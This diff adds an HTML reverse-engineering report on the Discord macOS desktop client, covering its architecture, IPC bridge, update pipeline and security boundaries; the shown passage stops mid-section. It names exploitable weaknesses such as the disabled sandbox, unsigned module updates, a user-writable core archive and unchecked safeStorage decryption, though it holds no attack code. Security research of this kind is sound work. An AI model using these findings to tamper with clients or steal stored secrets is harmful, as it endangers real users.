@@ -1,0 +1,1520 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Discord Desktop — Reverse Engineering Report</title>
+<script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+<style>
+  @page { size: A4; margin: 16mm 14mm 18mm 14mm; }
+  :root{
+    --ink:#15171c; --ink2:#3d4350; --mute:#6b7280; --line:#d8dce3;
+    --bg:#ffffff; --soft:#f6f7f9; --code:#f2f3f6;
+    --blue:#2b5fd9; --green:#117a4a; --amber:#9a6200; --red:#b42318; --violet:#6b3fa0;
+  }
+  *{box-sizing:border-box}
+  body{
+    font-family:-apple-system,"Helvetica Neue",Helvetica,Arial,sans-serif;
+    color:var(--ink); background:var(--bg);
+    font-size:9.6pt; line-height:1.52; margin:0;
+    -webkit-font-smoothing:antialiased;
+  }
+  h1{font-size:23pt;line-height:1.12;margin:0 0 6px;letter-spacing:-0.5px}
+  h2{font-size:13.5pt;margin:26px 0 8px;padding-bottom:5px;border-bottom:1.5px solid var(--ink);
+     letter-spacing:-0.2px;page-break-after:avoid}
+  h3{font-size:11pt;margin:18px 0 5px;color:var(--ink);page-break-after:avoid}
+  h4{font-size:9.8pt;margin:13px 0 4px;color:var(--ink2);page-break-after:avoid}
+  p{margin:0 0 7px}
+  ul,ol{margin:0 0 8px;padding-left:17px}
+  li{margin:0 0 3px}
+  code,kbd{font-family:"SF Mono",Menlo,Consolas,monospace;font-size:8.4pt;
+    background:var(--code);padding:1px 4px;border-radius:3px;word-break:break-word}
+  pre{background:var(--code);border:1px solid var(--line);border-left:3px solid var(--blue);
+    border-radius:4px;padding:8px 10px;overflow-x:auto;font-size:8pt;line-height:1.45;
+    margin:7px 0 10px;page-break-inside:avoid;white-space:pre-wrap;word-break:break-word}
+  pre code{background:none;padding:0;font-size:8pt}
+  table{width:100%;border-collapse:collapse;margin:8px 0 12px;font-size:8.3pt;page-break-inside:avoid}
+  th{background:var(--soft);text-align:left;padding:5px 7px;border:1px solid var(--line);
+     font-weight:600;font-size:8pt;vertical-align:bottom}
+  td{padding:5px 7px;border:1px solid var(--line);vertical-align:top}
+  tr:nth-child(even) td{background:#fbfcfd}
+  .lead{font-size:10.4pt;color:var(--ink2);margin:0 0 14px;line-height:1.5}
+  .meta{font-size:8pt;color:var(--mute);border-top:1px solid var(--line);
+        border-bottom:1px solid var(--line);padding:7px 0;margin:0 0 18px}
+  .meta b{color:var(--ink2);font-weight:600}
+  .card{border:1px solid var(--line);border-radius:5px;padding:10px 12px;margin:9px 0;
+        background:var(--soft);page-break-inside:avoid}
+  .card.ok{border-left:3px solid var(--green)}
+  .card.warn{border-left:3px solid var(--amber)}
+  .card.bad{border-left:3px solid var(--red)}
+  .card.info{border-left:3px solid var(--blue)}
+  .card.unk{border-left:3px solid var(--violet)}
+  .card h4{margin:0 0 6px;font-size:9.6pt;color:var(--ink)}
+  .f{margin:0 0 5px;display:flex;gap:9px;align-items:baseline}
+  .f b{flex:0 0 100px;font-size:7.4pt;letter-spacing:.4px;line-height:1.7;
+       text-transform:uppercase;color:var(--mute);font-weight:700}
+  .f span{flex:1;min-width:0}
+  .pill{display:inline-block;width:auto;flex:none;font-size:7.2pt;font-weight:700;letter-spacing:.4px;
+        text-transform:uppercase;padding:2px 6px;border-radius:9px;vertical-align:middle}
+  .p-conf{background:#dcf5e7;color:var(--green)}
+  .p-strong{background:#dbe7ff;color:var(--blue)}
+  .p-tent{background:#fdeccd;color:var(--amber)}
+  .p-unk{background:#ece0f8;color:var(--violet)}
+  .p-risk{background:#fde3e0;color:var(--red)}
+  .mermaid{background:#fff;margin:10px 0 14px;page-break-inside:avoid;text-align:center}
+  .mermaid svg{max-width:100%;height:auto}
+  .caption{font-size:7.8pt;color:var(--mute);text-align:center;margin:-8px 0 14px;font-style:italic}
+  .toc{background:var(--soft);border:1px solid var(--line);border-radius:5px;padding:11px 14px;
+       margin:0 0 18px;font-size:8.6pt;column-count:2;column-gap:22px}
+  .toc ol{margin:0;padding-left:16px}
+  .toc li{margin:0 0 2px}
+  .brk{page-break-before:always}
+  h2{orphans:3;widows:3}
+  .nobrk{page-break-inside:avoid}
+  .small{font-size:8pt;color:var(--mute)}
+  hr{border:0;border-top:1px solid var(--line);margin:16px 0}
+  .kv{font-size:8.4pt}
+  .kv td:first-child{width:36%;font-family:"SF Mono",Menlo,monospace;font-size:7.8pt}
+  .t-sec th:nth-child(1),.t-sec td:nth-child(1){width:17%}
+  .t-sec th:nth-child(2),.t-sec td:nth-child(2){width:25%}
+  .t-sec td code{word-break:normal;overflow-wrap:anywhere}
+  .mono{font-family:"SF Mono",Menlo,Consolas,monospace;font-size:7.9pt}
+  .ctr{text-align:center}
+</style>
+</head>
+<body>
+
+<h1>Discord Desktop — Deep Reverse&nbsp;Engineering Report</h1>
+<p class="lead">A static, evidence-backed reconstruction of how the Discord desktop client for macOS is
+assembled: its two shipped archives, its process and trust boundaries, its 136 privileged IPC
+endpoints, its native bridge, its update pipeline, and the external services it is wired to contact.
+Every claim below cites a file and line number from the installed build. Where the evidence stops,
+the report says so.</p>
+
+<div class="meta">
+<b>Target</b> Discord.app — host <span class="mono">1.0.9208</span> · core module <span class="mono">0.0.380</span> · macOS arm64 &nbsp;·&nbsp;
+<b>Method</b> static analysis only; no runtime instrumentation performed &nbsp;·&nbsp;
+<b>Artifacts</b> <span class="mono">app.asar</span> (sha256 <span class="mono">18d09f41…</span>) · <span class="mono">core.asar</span> (sha256 <span class="mono">a4…</span> see §3) &nbsp;·&nbsp;
+<b>Scope</b> JavaScript tiers only — compiled native modules not analysed &nbsp;·&nbsp;
+<b>Date</b> 2026-10-20
+</div>
+
+<div class="toc">
+<ol>
+<li><a href="#s1">Executive summary</a></li>
+<li><a href="#s2">Verified architecture</a></li>
+<li><a href="#s3">Project structure &amp; important files</a></li>
+<li><a href="#s4">Dependency graph</a></li>
+<li><a href="#s5">Call graph &amp; execution flows</a></li>
+<li><a href="#s6">Data-flow analysis</a></li>
+<li><a href="#s7">Event-flow analysis</a></li>
+<li><a href="#s8">Security &amp; permission boundaries</a></li>
+<li><a href="#s9">Network &amp; third-party inventory</a></li>
+<li><a href="#s10">Runtime observations &amp; limits</a></li>
+<li><a href="#s11">Configuration &amp; hidden switches</a></li>
+<li><a href="#s12">Dynamic-code investigation</a></li>
+<li><a href="#s13">Feature-to-file map</a></li>
+<li><a href="#s14">Findings &amp; remediation</a></li>
+<li><a href="#s15">Unresolved questions</a></li>
+<li><a href="#s16">Appendix — method &amp; reproduction</a></li>
+</ol>
+</div>
+
+<!-- ============================================================ -->
+<h2 class="nobrk" id="s1">1 · Executive summary</h2>
+
+<p><b>Discord desktop is a hardened browser shell around the Discord website.</b> It ships almost no
+product logic of its own. What it ships instead is a carefully fenced set of operating-system
+capabilities that the website is allowed to reach through one named bridge.</p>
+
+<p>Nine findings matter most:</p>
+
+<ol>
+<li><b>The UI is remote.</b> The main window loads <code>https://discord.com/app</code> over the network
+(<code>app/mainScreen.js:72,108,109</code>). Chat, voice UI, servers, settings screens — none of it is in
+either shipped archive.</li>
+
+<li><b>Two archives, two tiers.</b> <code>app.asar</code> inside the <code>.app</code> bundle is only a
+<i>launcher</i> (39 source files: splash screen, updater, connectivity tests). The real shell is
+<code>core.asar</code>, downloaded separately into <code>~/Library/Application&nbsp;Support/discord/0.0.380/</code>.
+The shell therefore self-updates independently of the macOS app bundle.</li>
+
+<li><b>The bridge is one object with 30 keys.</b> <code>contextBridge.exposeInMainWorld('DiscordNative', …)</code>
+at <code>app/mainScreenPreload.js:68</code>, built from 26 distinct capability modules.</li>
+
+<li><b>136 privileged IPC endpoints</b> are registered in the main process, drawn from a canonical
+enum of <b>144</b> channel names in <code>@discordapp/discord-native-types/IPCEvents.js</code>.</li>
+
+<li><b>Two real allow-lists exist.</b> <code>app/discord_native/renderer/ipc.js:9-10</code> restricts the
+generic IPC facade to 25 sendable and 13 invokable channels, throwing <code>'cannot send this event'</code>
+otherwise. This is a genuine, confirmed control — and it is also <i>narrower than the attack
+surface</i>, because the typed capability modules bypass that facade entirely (§8.3).</li>
+
+<li><b>Context isolation is on; the sandbox is off.</b> <code>contextIsolation:true</code>,
+<code>nodeIntegration:false</code>, but <code>sandbox:false</code> (<code>app/mainScreen.js:352-356</code>). The
+preload therefore holds full Node — and <code>renderer/fileManager.js</code> (24.7&nbsp;KB) does real
+<code>fs</code> I/O inside the renderer process rather than over IPC. This single setting defines the
+client's security posture.</li>
+
+<li><b>Permissions are deny-by-default</b> with origin checks (<code>mainScreen.js:388-428</code>), and
+off-origin navigation is blocked (<code>:526-530</code>) — except during a Google OAuth flow, where the
+restriction is deliberately lifted (§8.6).</li>
+
+<li><b>Module updates carry no JavaScript-level signature check.</b> The legacy path trusts HTTP 200
+and TLS (<code>common/moduleUpdater.js:572-605</code>), then extracts with <code>yauzl</code>. Path traversal
+is blocked — but by the library, not by Discord's code (§8.8). The <i>new</i> updater is compiled
+Rust and is outside this analysis.</li>
+
+<li><b>Crash reports from modded clients are filtered out.</b> <code>common/crashReporterSetup.js:70-71</code>
+ignores errors mentioning BetterDiscord and VencordPatcher and denies the
+<code>betterdiscord://</code> URL scheme.</li>
+</ol>
+
+<div class="card info">
+<h4>What this report deliberately does not claim</h4>
+<ul style="margin-bottom:0">
+<li>That the app <i>downloads all of its code on every launch</i>. It does not: only
+<code>shadercache</code> and the code caches are cleared at window creation
+(<code>mainScreen.js:379-383</code>). Chromium's HTTP cache is left intact, so subresources are served
+from disk on subsequent launches. Only the document URL is cache-busted, via
+<code>?_=${Date.now()}</code> at <code>mainScreen.js:90</code>.</li>
+<li>That any capability observed in code is actually <i>exercised</i>. No runtime tracing was done.</li>
+<li>That a third-party host receives user data because its URL appears in source. §9 separates
+"URL present" from "request observed" (which is: none).</li>
+<li>That <code>riotGames</code> implies a commercial partnership. The code reads Riot's publicly
+documented Live Client Data API on <code>127.0.0.1:2999</code> — no business relationship is required
+or evidenced.</li>
+</ul>
+</div>
+
+<!-- ============================================================ -->
+<h2 class="nobrk" id="s2">2 · Verified architecture</h2>
+
+<p>Four distinct execution contexts exist, two of which run with full OS authority.</p>
+
+<div class="mermaid">
+flowchart TB
+  subgraph HOST["macOS host"]
+    direction TB
+    subgraph MAIN["Electron MAIN process — full OS authority"]
+      BOOT["app.asar<br/>app_bootstrap/index.js<br/><i>launcher tier</i>"]
+      CORE["core.asar<br/>app/index.js : startup()<br/><i>shell tier</i>"]
+      BROWSERMODS["app/discord_native/browser/*<br/>24 modules · 136 IPC handlers"]
+      UPD["common/moduleUpdater.js<br/>common/updater.js"]
+    end
+    subgraph PRELOAD["PRELOAD world — Node enabled (sandbox:false)"]
+      PRE["app/mainScreenPreload.js"]
+      RMODS["app/discord_native/renderer/*<br/>26 capability modules<br/>direct fs · https · clipboard"]
+    end
+    subgraph REND["RENDERER world — isolated, no Node"]
+      WEB["https://discord.com/app<br/><i>the entire product UI</i>"]
+    end
+    NATIVE["Native modules<br/>discord_voice · discord_krisp<br/>discord_notifications · dispatch<br/><b>not analysed</b>"]
+  end
+  CDN["discord.com<br/>updates.discord.com"]
+
+  BOOT -->|"requires"| CORE
+  CORE --> BROWSERMODS
+  CORE --> UPD
+  UPD <-->|"HTTPS"| CDN
+  CORE -->|"BrowserWindow<br/>preload="| PRE
+  PRE --> RMODS
+  PRE -->|"contextBridge<br/>exposeInMainWorld"| WEB
+  WEB <-->|"HTTPS"| CDN
+  RMODS <-->|"ipcRenderer ↔ ipcMain<br/>144-name enum"| BROWSERMODS
+  BROWSERMODS -.->|"require()"| NATIVE
+
+  style MAIN fill:#fde8e6,stroke:#b42318
+  style PRELOAD fill:#fdeccd,stroke:#9a6200
+  style REND fill:#dcf5e7,stroke:#117a4a
+  style NATIVE fill:#ece0f8,stroke:#6b3fa0
+  style CDN fill:#dbe7ff,stroke:#2b5fd9
+</div>
+<p class="caption">Figure 1 — Trust tiers. Red and amber run with your user's full authority; green is fenced.
+The amber tier is the one that matters: it has Node, and it is one <code>contextBridge</code> hop from remote content.</p>
+
+<h3>2.1 The two-archive design, and why it exists</h3>
+
+<p><b>What we found.</b> The installed <code>.app</code> bundle contains an <code>app.asar</code> whose only job is
+to bootstrap. Its <code>Constants.js</code> resolves endpoints and settings, its <code>splashScreen.js</code> shows
+the loading window, and <code>moduleUpdater</code> fetches everything else. The shell that actually hosts
+Discord — <code>core.asar</code> — lives in the user's data directory under a version folder.</p>
+
+<p><b>Evidence.</b></p>
+<pre>/Applications/Discord.app/Contents/Resources/app.asar
+  app_bootstrap/   39 source files   ← launcher, splash, updater, connectivity tests
+  common/          16 source files   ← shared library (byte-identical set to core.asar's)
+  node_modules/  1020 files
+
+~/Library/Application Support/discord/0.0.380/modules/
+  discord_desktop_core/core.asar   9.2 MB  ← THE SHELL (2159 entries, 2032 JS files)
+  discord_voice/                    81 MB  ← compiled
+  discord_krisp/                     52 MB  ← compiled
+  …13 further native modules</pre>
+
+<p><b>What it means in simple English.</b> Installing Discord installs a <i>downloader</i>. The
+downloader fetches the real program into your home folder. That is why Discord can update itself
+without ever asking for an administrator password, and why the copy in <code>/Applications</code> barely
+changes.</p>
+
+<p><b>Why it matters.</b> It moves the real code out of a code-signed, root-owned bundle into a
+user-writable directory. Any process already running as your user can modify <code>core.asar</code>
+on disk. That is precisely how client mods such as BetterDiscord and Vencord operate — and it
+explains why <code>crashReporterSetup.js</code> has to filter their crash reports out (§8.11).</p>
+
+<p class="f"><b>Confidence</b> <span class="pill p-conf">Confirmed</span> — both archives inspected directly; file counts enumerated from the ASAR index.</p>
+
+<h3>2.2 Process and language tiers</h3>
+
+<table>
+<thead><tr><th>Tier</th><th>Where it lives</th><th>Authority</th><th>Entry point</th></tr></thead>
+<tbody>
+<tr><td><b>Launcher</b> (main)</td><td><code>app.asar → app_bootstrap/</code></td><td>Full user authority</td><td><code>app_bootstrap/index.js</code></td></tr>
+<tr><td><b>Shell</b> (main)</td><td><code>core.asar → app/</code></td><td>Full user authority</td><td><code>app/index.js : startup()</code></td></tr>
+<tr><td><b>Preload</b></td><td><code>core.asar → app/discord_native/renderer/</code></td><td>Node enabled; same OS rights</td><td><code>app/mainScreenPreload.js</code></td></tr>
+<tr><td><b>Renderer</b></td><td>remote — <code>discord.com</code></td><td>Isolated world, no Node</td><td><code>https://discord.com/app</code></td></tr>
+<tr><td><b>Native</b></td><td><code>modules/discord_*/</code></td><td>Native code in main or preload</td><td><span class="small">not analysed — compiled</span></td></tr>
+</tbody>
+</table>
+
+<!-- ============================================================ -->
+<h2 class="nobrk" id="s3">3 · Project structure &amp; important files</h2>
+
+<p>Of 2,448 entries in <code>core.asar</code>, only about 70 are hand-written source. The remainder are
+system-tray icon variants (≈200 PNG/ICO files at nine scale factors per platform) and
+<code>node_modules</code>. The high-value surface is small and readable.</p>
+
+<h3>3.1 Main-process shell — <code>core.asar → app/</code></h3>
+<table class="kv">
+<thead><tr><th>File</th><th>Size</th><th>Responsibility</th></tr></thead>
+<tbody>
+<tr><td>app/index.js</td><td>4.7 KB</td><td><b>Composition root.</b> <code>startup()</code> requires and wires every subsystem in a fixed order. The single most important file for understanding boot.</td></tr>
+<tr><td>app/mainScreen.js</td><td>43.1 KB</td><td><b>The window, and the security model.</b> Resolves <code>WEBAPP_ENDPOINT</code>, builds the <code>BrowserWindow</code>, installs permission/navigation/open handlers, owns the analytics and updater IPC relays.</td></tr>
+<tr><td>app/mainScreenPreload.js</td><td>3.5 KB</td><td><b>The bridge.</b> Assembles <code>DiscordNative</code> and exposes it. 78 lines; the hinge of the whole design.</td></tr>
+<tr><td>app/Constants.js</td><td>2.5 KB</td><td>Event-name groups (<code>UpdaterEvents</code>, <code>AnalyticsEvents</code>, <code>MenuEvents</code>), <code>AllowedMediaOrigins</code>, <code>WEBAPP_PATHS</code>; re-exports bootstrap constants.</td></tr>
+<tr><td>app/ipcMain.js</td><td>0.7 KB</td><td>Thin wrapper that auto-prefixes every channel with <code>DISCORD_</code>.</td></tr>
+<tr><td>app/popoutWindows.js</td><td>5.5 KB</td><td>Second window class for voice/video popouts; repeats the main window's origin checks.</td></tr>
+<tr><td>app/systemTray.js · thumbarButtons.js · appBadge.js · mouse.js</td><td>7.7 / 3.0 / 2.0 / 0.6 KB</td><td>OS chrome: tray menu, Windows thumbnail toolbar, dock badge, cursor position.</td></tr>
+<tr><td>app/rootCertificates.js + data/cacert.pem</td><td>0.8 KB + 245 KB</td><td>Bundles its own CA trust store for the <code>request</code> library rather than using the system store.</td></tr>
+<tr><td>app/data/riotgames.pem</td><td>1.5 KB</td><td>Riot Games' CA — pinned for the localhost League client API (§9.4).</td></tr>
+<tr><td>app/bootstrapModules/*.js</td><td>~0.3 KB each</td><td>11 one-line shims that re-export objects injected by the launcher tier, so shell code can <code>require</code> launcher singletons.</td></tr>
+</tbody>
+</table>
+
+<h3>3.2 The native bridge — <code>app/discord_native/</code></h3>
+<p>Three parallel directories, and the split is the architecture:</p>
+<ul>
+<li><code>browser/</code> — 24 modules that run in the <b>main</b> process and <i>register</i> IPC handlers.</li>
+<li><code>renderer/</code> — 26 modules that run in the <b>preload</b> and <i>call</i> them (or skip IPC entirely).</li>
+<li><code>common/</code> — 4 shared modules: <code>constants.js</code> (the <code>DISCORD_</code> prefixer),
+<code>DiscordIPC.js</code> (the main/renderer transport classes), <code>paths.js</code>, <code>fileutils.js</code>.</li>
+</ul>
+
+<p>Most pairs are symmetric, which makes the whole bridge mechanically legible: for a capability
+<i>X</i>, read <code>renderer/X.js</code> for the API the website sees and <code>browser/X.js</code> for what the
+main process will actually do. Three modules break the symmetry, and those are the interesting ones:</p>
+
+<table>
+<thead><tr><th>Module</th><th>Asymmetry</th><th>Consequence</th></tr></thead>
+<tbody>
+<tr><td><code>renderer/fileManager.js</code> (24.7 KB)</td><td>vs <code>browser/fileManager.js</code> (2.0 KB)</td><td>Main process only hands out <i>paths</i> and shows dialogs. All real file I/O happens in the preload with direct <code>fs</code>.</td></tr>
+<tr><td><code>renderer/minidump.js</code> (17.7 KB)</td><td>no browser counterpart</td><td>Crash-dump parsing and upload entirely preload-side.</td></tr>
+<tr><td><code>renderer/riotGames.js</code> (1.6 KB)</td><td>no browser counterpart</td><td>Makes its own outbound HTTPS request from the preload, bypassing the main process altogether.</td></tr>
+</tbody>
+</table>
+
+<h3>3.3 Shared library — <code>common/</code> (duplicated into both archives)</h3>
+<table class="kv">
+<thead><tr><th>File</th><th>Size</th><th>Responsibility</th></tr></thead>
+<tbody>
+<tr><td>common/moduleUpdater.js</td><td>31.9 KB</td><td>Legacy updater: queries <code>versions.json</code>, downloads module zips, extracts with <code>yauzl</code>.</td></tr>
+<tr><td>common/updater.js</td><td>21.0 KB</td><td>JSON-RPC-style wrapper around the <b>native</b> updater. Thin: the real logic is compiled.</td></tr>
+<tr><td>common/analytics.js</td><td>13.6 KB</td><td>Queues startup-timing events locally. Does <b>not</b> transmit (§6.5).</td></tr>
+<tr><td>common/blackbox.js</td><td>10.9 KB</td><td>Local rolling log + Crashpad minidump capture.</td></tr>
+<tr><td>common/crashReporterSetup.js</td><td>6.6 KB</td><td>Sentry init, six DSN keys, sample rates, mod-client filtering.</td></tr>
+<tr><td>common/paths.js</td><td>4.9 KB</td><td>Resolves every on-disk location; honours <code>DISCORD_USER_DATA_DIR</code>.</td></tr>
+<tr><td>common/securityUtils.js</td><td>1.4 KB</td><td><b>Three functions that carry most of the client's security weight</b> (§8.5).</td></tr>
+<tr><td>common/Settings.js</td><td>1.5 KB</td><td>A plain JSON file read/writer — the hidden-switch mechanism (§11).</td></tr>
+</tbody>
+</table>
+
+<p class="f"><b>Confidence</b> <span class="pill p-conf">Confirmed</span> — sizes and paths read from the ASAR directory index; every file listed was opened.</p>
+
+<!-- ============================================================ -->
+<h2 class="nobrk" id="s4">4 · Dependency graph</h2>
+
+<p>Built by following actual <code>require()</code> call sites, not by name similarity. Solid arrows are
+static <code>require</code>; dashed arrows are resolved dynamically at runtime.</p>
+
+<div class="mermaid">
+flowchart LR
+  subgraph L["Launcher tier — app.asar"]
+    BI["app_bootstrap/<br/>index.js"]
+    BS["bootstrap.js"]
+    BC["Constants.js"]
+    BSP["splashScreen.js"]
+    BRQ["request.js"]
+    BHU["hostUpdater.js"]
+  end
+  subgraph S["Shell tier — core.asar"]
+    IDX["app/index.js<br/><b>composition root</b>"]
+    MS["app/mainScreen.js"]
+    PRE["app/mainScreenPreload.js"]
+    CON["app/Constants.js"]
+    IPM["app/ipcMain.js"]
+    POP["app/popoutWindows.js"]
+    BSM["app/bootstrapModules/*<br/><i>11 shims</i>"]
+  end
+  subgraph B["Bridge"]
+    DNC["discord_native/common/<br/>constants.js<br/><b>getDiscordIPCEvent</b>"]
+    DIPC["discord_native/common/<br/>DiscordIPC.js"]
+    BRW["discord_native/browser/*<br/><i>24 modules</i>"]
+    RND["discord_native/renderer/*<br/><i>26 modules</i>"]
+  end
+  subgraph C["common/ — shared"]
+    SEC["securityUtils.js"]
+    MU["moduleUpdater.js"]
+    UP["updater.js"]
+    PTH["paths.js"]
+    SET["Settings.js"]
+    CRS["crashReporterSetup.js"]
+    BB["blackbox.js"]
+    AN["analytics.js"]
+  end
+  NPM["@discordapp/<br/>discord-native-types<br/><b>IPCEvents · 144 names</b>"]
+  NAT["native modules<br/>discord_*"]
+
+  BI --> BS --> BC --> SET
+  BS --> BSP
+  BS --> MU
+  MU --> BRQ
+  MU --> BHU
+  BS -.->|"loads downloaded core"| IDX
+  IDX --> BSM --> CON
+  IDX --> MS
+  IDX --> BRW
+  IDX --> CRS --> BB
+  MS --> SEC
+  MS --> IPM --> DNC
+  MS --> POP --> SEC
+  MS --> AN
+  MS -->|"webPreferences.preload"| PRE
+  PRE --> RND
+  BRW --> DIPC --> DNC
+  RND --> DIPC
+  DNC ==> NPM
+  BRW -.->|"require(modulePath)"| NAT
+  RND -.->|"requireModule()"| NAT
+  MU --> PTH
+  UP -.->|"native updater"| NAT
+
+  style NPM fill:#dbe7ff,stroke:#2b5fd9,stroke-width:2px
+  style DNC fill:#dbe7ff,stroke:#2b5fd9,stroke-width:2px
+  style IDX fill:#fde8e6,stroke:#b42318,stroke-width:2px
+  style SEC fill:#dcf5e7,stroke:#117a4a,stroke-width:2px
+  style NAT fill:#ece0f8,stroke:#6b3fa0
+</div>
+<p class="caption">Figure 2 — Dependency graph. Thick-bordered nodes are the choke points: every other module routes through them.</p>
+
+<h3>4.1 Central modules — the ones everything depends on</h3>
+
+<table>
+<thead><tr><th>Module</th><th>Depended on by</th><th>Why it is central</th></tr></thead>
+<tbody>
+<tr><td><code>@discordapp/discord-native-types/IPCEvents.js</code></td><td>Every <code>browser/</code> and <code>renderer/</code> module</td><td><b>The single source of truth for the IPC vocabulary.</b> 144 channel names. Nothing can talk across the boundary without a name from here.</td></tr>
+<tr><td><code>discord_native/common/constants.js</code></td><td>All bridge modules, <code>app/ipcMain.js</code></td><td>Exports <code>getDiscordIPCEvent()</code>, which forces a <code>DISCORD_</code> prefix onto every channel — a namespace guard against collisions with Electron's or a library's own channels.</td></tr>
+<tr><td><code>common/securityUtils.js</code></td><td><code>mainScreen.js</code>, <code>popoutWindows.js</code>, <code>systemTray.js</code>, <code>applicationMenu/darwin.js</code></td><td>Only 42 lines, but every origin and protocol decision in the client calls into it.</td></tr>
+<tr><td><code>app/index.js</code></td><td>— (it is the root)</td><td>Requires 28 subsystems in a deliberate order and performs dependency injection via <code>inject*()</code> functions.</td></tr>
+<tr><td><code>common/Settings.js</code></td><td><code>appSettings</code> → <code>Constants</code> → <code>mainScreen</code> → …</td><td>A JSON file on disk feeds the endpoint resolution of the entire app. Small file, enormous blast radius (§11).</td></tr>
+</tbody>
+</table>
+
+<h3>4.2 Verified relationships worth recording</h3>
+
+<table>
+<thead><tr><th>Source</th><th>→ Target</th><th>Kind</th><th>Evidence &amp; significance</th></tr></thead>
+<tbody>
+<tr><td><code>app/index.js:12-75</code></td><td>28 subsystems</td><td>static <code>require</code> + inject</td><td>Boot order is explicit and sequential; <code>mainScreen</code> is required <i>last</i> (<code>:89</code>) so every handler exists before a window can exist.</td></tr>
+<tr><td><code>common/moduleUpdater.js:232</code></td><td><code>../app_bootstrap/hostUpdater</code></td><td><b>cross-archive</b></td><td>Code inside <code>core.asar</code> requires a file that only exists in <code>app.asar</code>. Resolution works because the launcher injects its module paths (<code>common/nodeGlobalPaths.js</code>). A genuine coupling across the two archives.</td></tr>
+<tr><td><code>app/mainScreen.js:354</code></td><td><code>mainScreenPreload.js</code></td><td>config-as-dependency</td><td>The bridge is attached by a <i>string path</i> in <code>webPreferences</code>, not by <code>require</code> — so a static import graph alone would miss the single most security-relevant edge in the app.</td></tr>
+<tr><td><code>app/mainScreenPreload.js:22-48</code></td><td>26 <code>renderer/*</code> modules</td><td>static <code>require</code>, eager</td><td>Every capability module is loaded at preload time, before any page script runs.</td></tr>
+<tr><td><code>renderer/nativeModules.js:44</code></td><td><code>discord_voice</code>, <code>discord_krisp</code>, …</td><td><b>dynamic</b></td><td><code>require(name)</code> where <code>name</code> comes from the renderer, gated by <code>/^discord_[a-z0-9_-]+$/</code> or <code>'erlpack'</code> (<code>:41</code>).</td></tr>
+<tr><td><code>browser/notifications.js:30</code></td><td><code>discord_notifications</code></td><td><b>dynamic</b></td><td><code>require(path.join(moduleDataPath,'discord_notifications'))</code> — loads native code from the user-writable data directory.</td></tr>
+<tr><td><code>mainScreen.js:376</code></td><td><code>./ElectronTestRpc</code></td><td><b>dynamic, optional</b></td><td><code>includeOptionalModule()</code> — a test-automation RPC surface that is <i>absent</i> from the shipped archive. Confirmed missing: no such file in the ASAR index.</td></tr>
+</tbody>
+</table>
+
+<p><b>What it means in simple English.</b> The app is wired like a switchboard with one shared phone
+book. Three edges are invisible to ordinary import-tracing — the preload attached by filename, the
+native modules loaded by name at runtime, and the file that reaches across from one archive into the
+other — and all three are the security-relevant ones. That is the general lesson: in an Electron
+app, the dangerous dependencies are the ones that are not written as imports.</p>
+
+<!-- ============================================================ -->
+<h2 class="nobrk" id="s5">5 · Call graph &amp; execution flows</h2>
+
+<h3>5.1 Cold start — from double-click to rendered UI</h3>
+
+<div class="mermaid">
+sequenceDiagram
+  autonumber
+  participant U as User
+  participant L as app.asar<br/>launcher
+  participant MU as moduleUpdater
+  participant CDN as discord.com/api
+  participant I as core.asar<br/>app/index.js
+  participant MS as mainScreen.js
+  participant P as preload
+  participant W as discord.com/app
+
+  U->>L: launch Discord.app
+  L->>L: Constants.js — resolve API_ENDPOINT,<br/>UPDATE_ENDPOINT from settings.json
+  L->>L: splashScreen.show()
+  L->>MU: init(endpoint, buildInfo)
+  MU->>MU: remoteBaseURL = endpoint + /modules/stable
+  MU->>CDN: GET /modules/stable/versions.json<br/>?host_version=…&platform=osx
+  CDN-->>MU: {module: version, …}
+  opt a module is stale
+    MU->>CDN: GET /modules/stable/{name}/{version}
+    CDN-->>MU: module .zip
+    MU->>MU: yauzl extract → module_data/
+  end
+  L->>I: startup(bootstrapModules)
+  I->>I: require 24 browser/* modules<br/>→ 136 ipcMain handlers registered
+  I->>I: rootCertificates.init() — load cacert.pem
+  I->>I: Menu.setApplicationMenu(enableDevtools)
+  I->>MS: require('./mainScreen').init()
+  MS->>MS: getWebappEndpoint() → https://discord.com
+  MS->>MS: new BrowserWindow({contextIsolation:true,<br/>sandbox:false, preload:…})
+  MS->>MS: setPermissionRequestHandler (deny-by-default)
+  MS->>MS: on('will-navigate') — origin fence
+  MS->>MS: loadURL(https://discord.com/app?_=<ts>)
+  MS->>P: preload executes first
+  P->>P: require 26 renderer/* modules
+  P->>W: contextBridge.exposeInMainWorld('DiscordNative', …)
+  W->>W: web app boots, reads window.DiscordNative
+  W-->>MS: ipc.send(APP_ASYNC_INDEX_TSX_LOADED)
+  MS->>MS: splashScreen.pageReady() — swap windows
+</div>
+<p class="caption">Figure 3 — Cold start. Verified against <code>app_bootstrap/bootstrap.js</code>, <code>app/index.js:11-103</code>,
+<code>app/mainScreen.js:61-109, 304-308, 339-374, 475-501</code>, <code>common/moduleUpdater.js:232-291, 487-494</code>.</p>
+
+<p><b>Why step 22 matters.</b> The splash screen does not disappear on a timer. It waits for the
+<i>remote web app</i> to report that it has rendered, via <code>APP_ASYNC_INDEX_TSX_LOADED</code> — one of
+the 25 channels on the send allow-list. The desktop shell's own readiness is not the gate; the
+website's is.</p>
+
+<h3>5.2 Feature trace — <code>safeStorage</code>, the most security-relevant round trip</h3>
+
+<div class="mermaid">
+sequenceDiagram
+  autonumber
+  participant W as Renderer<br/>discord.com
+  participant P as Preload<br/>renderer/safeStorage.js
+  participant M as Main<br/>browser/safeStorage.js
+  participant K as macOS Keychain
+
+  W->>P: DiscordNative.safeStorage.encryptString(secret)
+  Note over P: :16 — no validation
+  P->>M: ipcRenderer.sendSync(<br/>DISCORD_SAFE_STORAGE_ENCRYPT_STRING, secret)
+  Note over M: :15 — handler has NO sender check,<br/>NO origin check, NO rate limit
+  M->>K: electron.safeStorage.encryptString(plainText)
+  K-->>M: encrypted Buffer
+  M-->>P: event.returnValue = buf.toString('base64')
+  P-->>W: base64 string
+  W->>W: store in localStorage / IndexedDB
+
+  rect rgb(253,232,230)
+    Note over W,K: DECRYPT is the mirror image —<br/>any script in the renderer can decrypt<br/>anything previously encrypted
+  end
+</div>
+<p class="caption">Figure 4 — <code>safeStorage</code> round trip. <code>renderer/safeStorage.js:9-17</code>; <code>browser/safeStorage.js:12-32</code>.</p>
+
+<p><b>What we found.</b> Three synchronous handlers — <code>IS_ENCRYPTION_AVAILABLE</code>,
